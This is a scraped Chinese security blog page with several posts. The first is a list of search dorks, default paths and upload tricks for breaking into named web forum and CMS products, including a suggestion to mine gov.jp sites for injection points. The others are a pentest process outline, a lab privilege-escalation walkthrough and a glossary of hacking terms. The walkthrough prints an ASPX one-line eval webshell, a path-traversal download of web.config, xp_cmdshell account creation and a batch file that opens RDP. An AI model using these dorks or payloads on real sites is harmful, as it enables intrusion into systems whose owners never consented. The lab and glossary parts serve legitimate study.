43 、漏洞是利用管理员 iis 设置的失误用 baidu 关键字就是比较罕见的脚本名动网: ReloadForumCache.asp Leadbbs: makealltopanc.asp BBSXP: admin_fso.asp 动易: admin_articlerecyclebin.asp
44 、国外站的爆库漏洞关键字： sad Raven's Guestbook 密码地址:/passwd.dat 后台地址:/admin.php
45 、 关键字：尚奈克斯后台路径 /system/manage.asp 直接传 ASP 木马
46 、 工具 1:网站猎手 2:大马一个关键字:切勿关闭 Cookies 功能，否则您将不能登录插入 diy.asp
47 、关键字:Team5 Studio All rights reserved 默认数据库:data/team.mdb
48. 工具: 挖掘机 辅臣数据库读取器关键字: 企业简介 产品展示 产品列表后缀添加: /database/myszw.mdb 后台地址: admin/Login.asp
49. 关键子 XXX inurl:Nclass.asp 在"系统设置"里写个木马。会被保存到 在 config.asp 内。
50. 不进后台照样拿动网 WEBSHELL data.asp?action=BackupData 动网数据库备份默认路径 36. 工具:网站猎手 WebShell 关键字:inurl:Went.asp 后缀:manage/login.asp 弱口令:'or'='or'
51 、 入侵雷池新闻发布系统关键字:leichinews 去掉 leichinews 后面的. 打上:admin/uploadPic.asp?actionType=mod&picName=xuanran.asp 再上传马..... 进访问 uppic anran.asp 登陆马.
52. 一、通过 GOOGLE 搜索找大量注入点关键字： asp?id=1 gov.jp/ asp?id= 页数： 100 语言：想入侵哪个国家就填什么语言吧
53. 关键字： Powered by:94KKBBS 2005 利用密码找回功能 找回 admin 提问:ddddd 回答:ddddd
54. 关键字:****** inurl:readnews.asp 把最后一个 /改成%5c ,直接暴库,看密码,进后台随便添加个新闻 在标题输入我们的一句话木马
55. 工具:一句话木马 BBsXp 5.0 sp1 管理员猜解器关键词:powered by bbsxp5.00 进后台,备份一句话马!
56. 关键字：程序核心： BJXSHOP 网上开店专家 后台:/admin
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="魏超">
      <meta itemprop="description" content="胡歌">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ClearLoveの博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/" class="post-title-link" itemprop="url">渗透测试流程</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-18 17:57:00" itemprop="dateCreated datePublished" datetime="2019-11-18T17:57:00+08:00">2019-11-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-11-20 13:42:11" itemprop="dateModified" datetime="2019-11-20T13:42:11+08:00">2019-11-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>
1.明确目标
1）确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块
2）确定规则：能渗透到什么程度（发现漏洞为止or继续利用漏洞）、时间限制、能否修改上传、能否提权...
• 目标系统介绍、重点保护对象及特性。
• 是否允许数据破坏？
• 是否允许阻断业务正常运行？
• 测试之前是否应当知会相关部门接口人？
• 接入方式？外网和内网？
• 测试是发现问题就算成功，还是尽可能的发现多的问题？
• 渗透过程是否需要考虑社会工程？
3）确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？
根据需求和自己技术能力来确定能不能做、能做多少</pre></code>

<pre><code>2.分析风险，获得授权
分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本...
由测试方书写实施方案初稿并提交给客户（or本公司内部领导）进行审核。在审核完成后，从客户（or本公司内部领导）获取对测试方进行书面委托授权书，授权测试方进行渗透测试。</pre></code>

<pre><code>3.信息收集
在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。
方式：主动扫描；开放搜索
开放搜索：利用搜索引擎获得后台、未授权页面、敏感url
基础信息：IP，网段，域名，端口
系统信息：操作系统版本
应用信息：各端口的应用，例如web应用，邮件应用等
版本信息：所有探测到的版本
服务信息：服务器类型、版本
人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等
防护信息：试着看能否探测到防护设备</pre></code>

<p>4.漏洞探测（手动&amp;自动）</p>
<pre><code>利用上一步中列出的信息，使用相应的漏洞检测
方法：
1）漏扫：AWVS、AppScan...
2）结合漏洞去exploit-db等位置找利用
3）在网上寻找验证POC
内容：
系统漏洞：系统没有及时打补丁
Websever漏洞：Websever配置问题
Web应用漏洞：Web应用开发问题
其它端口服务漏洞：各种21/8080(st2)/7001/22/3389
通信安全：明文传输，token在cookie中传送等</pre></code>

<p>5.漏洞验证</p>
<pre><code>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验，成功后再应用于目标中。
• 自动化验证：结合自动化扫描工具提供的结果
• 手工验证：根据公开资源进行验证
• 试验验证：自己搭建模拟环境进行验证
• 登录猜解：有时可以尝试猜解一下登陆口的账号密码等信息
• 业务漏洞验证：如发现业务漏洞，要进行验证
• 公开资源的利用
exploit-db/wooyun/
渗透代码网站
通用、缺省口令
厂商的漏洞警告等</pre></code>

<p>6.信息分析</p>
<pre><code>为下一步实施渗透做准备
• 精准攻击：准备好上一步探测到的漏洞exp（漏洞利用），用来精准攻击
• 绕过防御机制：是否有防火墙等设备，如何绕过
• 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标
• 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）
• 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</pre></code>

<p>7.利用漏洞，获取数据</p>
<pre><code>• 实施攻击：根据前几步的结果，进行攻击
• 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）
• 进一步渗透：内网入侵，敏感目标
• 持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等
• 清理痕迹：清理相关日志（访问，操作），上传文件等</pre></code>

<p>8.信息整理</p>
<pre><code>• 整理渗透工具：整理渗透过程中用到的代码，poc，exp等
• 整理收集信息：整理渗透过程中收集到的一切信息
• 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息
目的：为了最后形成报告，形成测试结果使用。</pre></code>

<p>9.形成报告</p>
<pre><code>• 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告
• 补充介绍：要对漏洞成因，验证过程和带来危害进行分析
修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</pre></code>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/18/%E6%A1%88%E4%BE%8B%E4%B8%80%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="魏超">
      <meta itemprop="description" content="胡歌">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ClearLoveの博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/18/%E6%A1%88%E4%BE%8B%E4%B8%80%E6%8F%90%E6%9D%83/" class="post-title-link" itemprop="url">案例一-提权</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-18 15:38:33" itemprop="dateCreated datePublished" datetime="2019-11-18T15:38:33+08:00">2019-11-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-11-19 10:38:23" itemprop="dateModified" datetime="2019-11-19T10:38:23+08:00">2019-11-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>仅知道靶机的ip是172.16.12.131，现在需要一步步去获取更多的信息。</p>
<p>一、获取靶机的登录权限：<br>1、探测靶机开放端口：</p>
<p><img src="/images/pasted-4.png" alt="upload successful"><br>发现1433端口开放。1433对应mssqlserver数据库服务。</p>
<p>2、继续探测非默认服务端口，发现27689端口对外开放</p>
<p><img src="/images/pasted-5.png" alt="upload successful"></p>
<p>3、尝试用浏览器访问，发现是web服务端口，打开网页如下：</p>
<p><img src="/images/pasted-7.png" alt="upload successful"></p>
<p>4、可以尝试暴力破解用户名和密码，或者尝试用后台扫描工具扫描网站。暴力破解费时费力，成功率不高，所以优先扫描网站后台：</p>
<p><img src="/images/pasted-8.png" alt="upload successful"></p>
<p>检查发现的后台文件，发现robots.txt文件，双击打开<a href="http://172.16.12.131:27689/robots.txt" target="_blank" rel="noopener">http://172.16.12.131:27689/robots.txt</a><br>内容如下：<br><img src="/images/pasted-9.png" alt="upload successful"></p>
<p>5、从robots.txt发现2个aspx页面，访问其中file_down.aspx页面如下：</p>
<p><img src="/images/pasted-10.png" alt="upload successful"></p>
<p>从出错信息可以看到下载目录是/upfile/affix，使用../../可以到达网站根目录。一般情况下，.net网站的配置文件是web.config，尝试使用下载页面下载web.config文件：<br>构造下载链接：<a href="http://172.16.12.131:27689/admin/file_down.aspx?file=../../web.config" target="_blank" rel="noopener">http://172.16.12.131:27689/admin/file_down.aspx?file=../../web.config</a></p>
<p><img src="/images/pasted-11.png" alt="upload successful"></p>
<p>成功拿到当前网站的数据库用户和密码。</p>
<p><img src="/images/pasted-12.png" alt="upload successful"><br>6、使用navicat访问数据库，拿到admin的密码（如果是md5加密，也可以手动设置新密码，将新密码的md5值存到数据库）</p>
<p><img src="/images/pasted-13.png" alt="upload successful"></p>
<p><img src="/images/pasted-14.png" alt="upload successful"></p>
<p><img src="/images/pasted-15.png" alt="upload successful"><br>7、使用admin帐号和密码成功登录页面：<br><img src="/images/pasted-16.png" alt="upload successful"></p>
<p>二、获取靶机服务器webshell权限<br>1、访问网站的各个页面，寻找有用信息。</p>
<p><img src="/images/pasted-17.png" alt="upload successful"> </p>
<p><img src="/images/pasted-18.png" alt="upload successful"><br>1）    系统对上传文件进行简单过滤，允许上传图像文件。<br>2）    文件名最长为32位字符，超过这一长度将进行截断</p>
<p>2、根据上面两条信息可以上传木马从而拿到webshell权限<br>1）制作包含一句话木马的图像文件：<br>新建a.txt:<br>写入GIF89a &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“z”],”unsafe”);%&gt;<br>修改a.txt为a.jpg<br>2）上传任一超长文件名文件，发现新生成的文件名前19位是系统生成，后13位是从原文件名里截取。所以将a.jpg修改为12345678.aspx.jpg，其中前13位正好是12345678.aspx。上传12345678.aspx.jpg，最终得到后台文件637084795826686250-12345678.aspx。<br>3）使用中国菜刀连接木马：</p>
<p><img src="/images/pasted-19.png" alt="upload successful"></p>
<p><img src="/images/pasted-20.png" alt="upload successful"></p>
<p>三、提权并开启远程桌面访问，获取服务器管理权限<br>1、目前只能拿到web网站的权限，权限是”network service”，无法访问管理员目录，见下图：</p>
<p><img src="/images/pasted-21.png" alt="upload successful"></p>
<p>2、从网站后台文件查找信息，发现bak文件里有sa用户的密码:</p>
<p><img src="/images/pasted-22.png" alt="upload successful"></p>
<p><img src="/images/pasted-23.png" alt="upload successful"></p>
<p>3、使用navicat工具连接数据库</p>
<p><img src="/images/pasted-24.png" alt="upload successful"><br>4、开启sqlserver的xp_cmdshell功能</p>
<p><img src="/images/pasted-25.png" alt="upload successful"></p>
<p>5、“sa”具有 管理员权限</p>
<p><img src="/images/pasted-26.png" alt="upload successful"><br>6、新建帐号test，并转到administrators组（也可以直接net user administrator 123456强行修改administrator帐号密码）</p>
<p><img src="/images/pasted-27.png" alt="upload successful"></p>
<p><img src="/images/pasted-28.png" alt="upload successful"></p>
<p><img src="/images/pasted-29.png" alt="upload successful"></p>
<p>7、通过菜刀上传开启3389端口的.bat文件，上传到D:\web\upfile\affix\目录下：<br>3389.bat：<br>echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg<br>echo “fDenyTSConnections”=dword:00000000&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>regedit /s 3389.reg<br>del 3389.reg</p>
<p>8、开启3389端口，并关闭本机防火墙</p>
<p><img src="/images/pasted-30.png" alt="upload successful"></p>
<p><img src="/images/pasted-31.png" alt="upload successful"></p>
<p>9、远程桌面连接系统，具有管理员权限，可以随意对服务器进行操作。</p>
<p><img src="/images/pasted-32.png" alt="upload successful"></p>
<p><img src="/images/pasted-33.png" alt="upload successful"></p>
<p>二、第二种提权方法<br>拿到’shell’后，执行whoami，发现权限较低，尝试提权</p>
<p><img src="/images/pasted-34.png" alt="upload successful"><br>1、首先systeminfo查看系统补丁情况，可参考如下图所示补丁对应的提权</p>
<p><img src="/images/pasted-35.png" alt="upload successful"></p>
<p><img src="/images/pasted-36.png" alt="upload successful"><br>2、发现可以pr提权，上传pr和cmd到可读可写目录，设置上传后的cmd的路径为终端路径（setp “上传后的路径地址”）</p>
<p><img src="/images/pasted-37.png" alt="upload successful"><br>3、发现pr可以执行whoami，但无法执行net user（提示拒绝访问，说明net命令无权限），上传net到pr工具同一目录下就可以执行了</p>
<p><img src="/images/pasted-38.png" alt="upload successful"></p>
<p><img src="/images/pasted-39.png" alt="upload successful"></p>
<p>4、到这提权基本结束了，拿到system权限，修改administrator的密码，开3389登录拿到’key’</p>
<p><img src="/images/pasted-40.png" alt="upload successful"></p>
<p><img src="/images/pasted-41.png" alt="upload successful"><br>至此，拿到了服务器的最高权限。对这个过程进行回顾，发现信息泄漏起到了很关键的作用，而这些泄漏方式在实际研发过程中是普遍存在的，比如在robots.txt文件里泄漏了后台页面的名字，比如将备份的配置文件.bak保留在原地，比如提示提示文件名截断的说明信息等等。<br>如果说应用系统本身存在的上传下载等漏洞是技术（能力）上的硬伤，那这些信息泄漏就是工作习惯（态度）上的软伤。安全加固，需要从技术和开发习惯两方面共同下功夫，两手抓两手都要硬。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="魏超">
      <meta itemprop="description" content="胡歌">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ClearLoveの博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/15/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/" class="post-title-link" itemprop="url">网络安全专业术语</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-15 11:08:00" itemprop="dateCreated datePublished" datetime="2019-11-15T11:08:00+08:00">2019-11-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-11-19 15:50:36" itemprop="dateModified" datetime="2019-11-19T15:50:36+08:00">2019-11-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>1.肉鸡：<br>所谓“肉鸡”是一种很形象的比喻，比喻那些可以随意被我们控制的电脑，对方可以是WINDOWS系统，也可以是UNIX/LINUX系统，可以是普通的个人电脑，也可以是大型的服务器，我们可以象操作自己的电脑那样来操作它们，而不被对方所发觉。</p>
<p>2.木马：<br>就是那些表面上伪装成了正常的程序，但是当这些被程序运行时，就会获取系统的整个控制权限。有很多黑客就是热中与使用木马程序来控制别人的电脑，比如灰鸽子，黑洞，PcShare等等。</p>
<p>3.网页木马：<br>表面上伪装成普通的网页文件或是将而已的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马的服务端下载到访问者的电脑上来自动执行。</p>
<p>4.挂马：<br>就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马。</p>
<p>5.后门：<br>这是一种形象的比喻，入侵者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置。这些改动表面上是很难被察觉的，但是入侵者却可以使用相应的程序或者方法来轻易的与这台电脑建立连接，重新控制这台电脑，就好象是入侵者偷偷的配了一把主人房间的要是，可以随时进出而不被主人发现一样。 通常大多数的特洛伊木马（Trojan Horse）程序都可以被入侵者用语制作后门（BackDoor）</p>
<p>6.rootkit：<br>rootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成WINDOWS下的system或者管理员权限）访问权限的工具。通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过，对方系统内存在的安全漏洞获得系统的root权限。然后，攻击者就会在对方的系统中安装rootkit，以达到自己长久控制对方的目的，rootkit与我们前边提到的木马和后门很类似，但远比它们要隐蔽，黑客守卫者就是很典型的rootkit，还有国内的ntroorkit等都是不错的rootkit工具。</p>
<p>7.IPC$：<br>是共享“命名管道”的资源，它是为了让进程间通信而开放的饿命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计<br>算机和查看计算机的共享资源时使用。</p>
<p>8.弱口令：<br>指那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）</p>
<p>9.默认共享：<br>默认共享是WINDOWS2000/XP/2003系统开启共享服务时自动开启所有硬盘的共享，因为加了”$”符号，所以看不到共享的托手图表，也成为隐藏共享。</p>
<p>10.shell：<br>指的是一种命令指行环境，比如我们按下键盘上的“开始键+R”时出现“运行”对话框，在里面输入“cmd”会出现一个用于执行命令的黑窗口，这个就是WINDOWS的Shell执行环境。通常我们使用远程溢出程序成功溢出远程电脑后得到的那个用于执行系统命令的环境就是对方的shell</p>
<p>11.WebShell：<br>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门。黑客在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，好后就可以使用浏览器来访问这些asp 或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。可以上传下载文件，查看数据库，执行任意程序命令等。国内常用的WebShell有海阳ASP木马，Phpspy，c99shell等</p>
<p>12.溢出：<br>确切的讲，应该是“缓冲区溢出”。简单的解释就是程序对接受的输入数据没有执行有效的检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。大致可以分为两类：（1）堆溢出；（2）栈溢出。</p>
<p>13.注入：<br>随着B/S模式应用开发的发展，使用这种模式编写程序的程序员越来越来越多，但是由于程序员的水平参差不齐相当大一部分应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想要知的数据，这个就是所谓的SQLinjection，即：SQL注入。</p>
<p>14.注入点：<br>是可以实行注入的地方，通常是一个访问数据库的连接。根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同。</p>
<p>15.内网：<br>通俗的讲就是局域网，比如网吧，校园网，公司内部网等都属于此类。查看IP地址如果是在以下三个范围之内的话，就说明我们是处于内网之中的：10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255</p>
<p>16.外网：<br>直接连入INTERNET（互连网），可以与互连网上的任意一台电脑互相访问，IP地址不是保留IP（内网）IP地址。</p>
<p>17.端口：<br>（Port）相当于一种数据的传输通道。用于接受某些数据，然后传输给相应的服务，而电脑将这些数据处理后，再将相应的恢复通过开启的端口传给对方。一般每一个端口的开放的偶对应了相应的服务，要关闭这些端口只需要将对应的服务关闭就可以了。</p>
<ol start="18">
<li>3389、4899肉鸡：<br>3389是Windows终端服务（Terminal Services）所默认使用的端口号，该服务是微软为了方便网络管理员远程管理及维护服务器而推出的，网络管理员可以使用远程桌面连接到网络上任意一台开启了终端服务的计算机上，成功登陆后就会象操作自己的电脑一样来操作主机了。这和远程控制软件甚至是木马程序实现的功能很相似，终端服务的连接非常稳定，而且任何杀毒软件都不会查杀，所以也深受黑客喜爱。黑客在入侵了一台主机后，通常都会想办法先添加一个属于自己的后门帐号，然后再开启对方的终端服务，这样，自己就随时可以使用终端服务来控制对方了，这样的主机，通常就会被叫做3389肉鸡。Radmin是一款非常优秀的远程控制软件，4899就是Radmin默认使用也经常被黑客当作木马来使用（正是这个原因，目前的杀毒软件也对Radmin查杀了）。有的人在使用的服务端口号。因为Radmin的控制功能非常强大，传输速度也比大多数木马快，而且又不被杀毒软件所查杀，所用Radmin管理远程电脑时使用的是空口令或者是弱口令，黑客就可以使用一些软件扫描网络上存在Radmin空口令或者弱口令的主机，然后就可以登陆上去远程控制对恶劣，这样被控制的主机通常就被成做4899肉鸡。</li>
</ol>
<p>19.免杀：<br>就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。</p>
<p>20.加壳：<br>就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。</p>
<p>21.花指令：<br>就是几句汇编指令，让汇编语句进行一些跳转，使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是”杀毒软件是从头到脚按顺序来查找病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了。</p>
<p>22.什么是TCP/IP<br>是一种网络通信协议，他规范了网络上所有的通信设备，尤其是一个主机与另一个主机之间的数据往来格式以及传送方式.，TCP/IP是INTERNET的基础协议，也是一种电脑数据打包和寻址的标准方法.在数据传诵中，可以形象地理解为两个信封，TCP和IP就像是信封，要传递的信息被划为若干段，<br>每一段塞入一个TCP信封，并在该信封面上记录有分段号的信息，再将TCP信封塞入IP大信封，发送上网.</p>
<p>23.什么是路由器<br>路由器应该是在网络上使用最高的设备之一了，它的主要作用就是路由选路，将IP数据包正确的送到目的地，因此也叫IP路由器.</p>
<p>24.什么是蜜罐<br>好比是情报收集系统.蜜罐好象是故意让人攻击的目标，引诱黑客来攻击，所有攻击者入侵后，你就可以知道他是如何得逞的，随时了解针对你的服<br>务器发动的最新的攻击和漏洞.还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络.</p>
<p>25.什么是拒绝服务攻击<br>DOS是DENIALOFSERVICE的简称，即拒绝服务，造成DOS的攻击行为被称为DOS攻击，其目的是使计算机或网络无法正常服务，最常见的DOS攻击有计算机网络宽带攻击和连通性攻击，连通性攻击指用大量的连接请求冲击计算机，使得所有可用的操作系统资源被消耗，最终计算机无法再处理合法用户的请求.</p>
<p>26.什么是脚本注入攻击(SQLINJECTION)<br>所谓脚本注入攻击者把SQL命令插入到WEB表单的输入域或也面请求的查学字符串，欺骗服务器执行恶意的SQL命令，在某些表单中，用户输入的内容直接用来构造动态的SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击.</p>
<p>27.什么是防火墙?它是如何确保网络安全的<br>使用防火墙（Firewall）是一种确保网络安全的方法。防火墙是指设置在不同网络（如可信任的企业内部网和不可信的公共网）或网络安全域之间的一系列部件的组合。它是不同网络或网络安全域之间信息的惟一出入口，能根据企业的安全政策控制（允许、拒绝、监测）出入网络的信息流，且本身具有较强的抗攻击能力。它是提供信息安全服务，实现网络和信息安全的基础设施。</p>
<p>28.什么是后门?为什么会存在后门？<br>后门（BackDoor）是指一种绕过安全性控制而获取对程序或系统访问权的方法。在软件的开发阶段，程序员常会在软件内创建后门以便可以修改程序中的缺陷。如果后门被其他人知道，或是在软件之前没有删除，那么它就成了安全隐患。</p>
<p>29.什么叫入侵检测<br>入侵检测是防火墙的合理补充，帮助系统对付网络攻击，扩展系统管理员的安全管理能力（包括安全审计、监视、进攻识别和响应），提高信息安全基础结构的完整性。它从计算机网络系统中的若干关键点收集信息，并分析这些信息，检查网络中是否有违反安全策略的行为和遭到袭击的迹象</p>
<p>30.什么叫数据包监测，它有什么作用<br>数据包监测可以被认为是一根窃听电话线在计算机网络中的等价物。当某人在“监听”网络时，他们实际上是在阅读和解释网络上传送的数据包。如果你需要在互联网上通过计算机发送一封电子邮件或请求下载一个网页，这些操作都会使数据通过你和数据目的地之间的许多计算机。这些传输信息时经过的计算机都能够看到你发送的数据，而数据包监测工具就允许某人截获数据并且查看它。在这里值得一题的是，美国的落山基级骇动力潜艇就有几艘专们用于海底电缆的数据监听。特别是太平洋。</p>
<p>31.什么是NIDS<br>NIDS是NetworkIntrusionDetectionSystem的缩写，即网络入侵检测系统，主要用于检测Hacker或Cracker<br>通过网络进行的入侵行为。NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一<br>种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。</p>
<p>32.什么叫SYN包<br>TCP连接的第一个包，非常小的一种数据包。SYN攻击包括大量此类的包，由于这些包看上去实际不存在的<br>站点，因此无法有效进行处理。</p>
<p>33.加密技术是指什么<br>加密技术是最常用的安全保密手段，利用技术手段把重要的数据变为乱码（加密）传送，到达目的地后再<br>用相同或不同的手段还原（解密）。<br>加密技术包括两个元素：算法和密钥。算法是将普通的信息或者可以理解的信息与一串数字（密钥）结合<br>，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解密的一种算法。在安全保密中，可通过适当的<br>钥加密技术和管理机制来保证网络的信息通信安全。</p>
<p>34.局域网内部的ARP攻击是指什么<br>ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。<br>基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当<br>前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。一般<br>情况下，受到ARP攻击的计算机会出现两种现象:<br>1.不断弹出“本机的XXX段硬件地址与网络中的XXX段地址冲突”的对话框。<br>2.计算机不能正常上网，出现网络中断的症状。<br>因为这种攻击是利用ARP请求报文进行“欺骗”的，所以防火墙会误以为是正常的请求数据包，不予拦截<br>。因此普通的防火墙很难抵挡这种攻击。</p>
<p>35.什么叫欺骗攻击?它有哪些攻击方式<br>网络欺骗的技术主要有:HONEYPOT和分布式HONEYPOT、欺骗空间技术等。主要方式有:IP欺骗、ARP欺骗、<br>DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送<br>假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。<br>嗅探<br>计算机网络的共享通讯道的，支持每对通讯计算机独占通道的交换机/集线器仍然过于昂贵，共享意为着<br>计算机能够接收到发送给其他计算机的信息，捕获在网络中传输的数据信息就称为嗅探.</p>
<p>36.木马<br>全称为特洛伊木马(TrojanHorse)，是根据希腊神话传说中一次战争而得名。麦尼劳斯派兵讨伐特洛伊国<br>王，他们假装打败，然后留下一个大木马，而木马里却藏着最强悍的勇士！最后等晚上时间一到，木马里的勇<br>士就冲出来把敌人打败了。这就是后来的”木马计”，而黑客中的木马有点后门的意思，就是把预谋的功能隐<br>藏在公开的功能里，掩饰真正的企图。</p>
<p>37.肉鸡<br>已经被攻击了，对其具有控制权的主机。</p>
<p>38.跳板<br>一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。</p>
<p>39.弱口令<br>所谓弱口令也就是指密码与用户名相同，密码为空的用户名与密码组合，也包括那些密码强度不够，容易<br>被猜解的组合，一般专业认识不会犯这种错误。</p>
<p>40.权限<br>计算机用户对于文件及目录的建立，修改，删除以及对于某些服务的访问，程序的执行，是以权限的形式<br>来严格区分的.被赋予了相应的权限，就可以进行相应的操作，否则就不可以.</p>
